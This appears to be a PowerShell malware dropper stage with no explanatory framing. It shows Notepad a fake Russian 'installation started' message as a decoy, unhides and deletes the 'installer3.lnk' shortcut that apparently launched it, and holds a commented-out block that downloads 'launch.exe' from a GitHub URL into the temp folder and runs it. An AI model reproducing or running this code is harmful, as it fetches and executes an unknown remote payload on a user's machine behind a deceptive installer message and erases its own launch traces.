$txt = "$env:TEMP\info.txt"

@"
Установка запущена.

Пожалуйста, подождите...
"@ | Out-File $txt -Encoding UTF8

Start-Process notepad.exe $txt

$folder = (Get-Location).Path

$lnk = Join-Path $folder "installer3.lnk"
$txt = Join-Path $folder "installer.txt"

Start-Sleep -Seconds 1

attrib -r -s -h $lnk
[System.IO.File]::Delete($lnk)

# @"
# Установка запущена.

# Пожалуйста, подождите...
# "@ | Out-File $txt -Encoding UTF8

# $wc = New-Object System.Net.WebClient
# $wc.DownloadFile('https://raw.githubusercontent.com/nesabydy00/dgeagagaeg/main/launch.exe', "$env:TEMP\a.exe")
# & "$env:TEMP\a.exe"
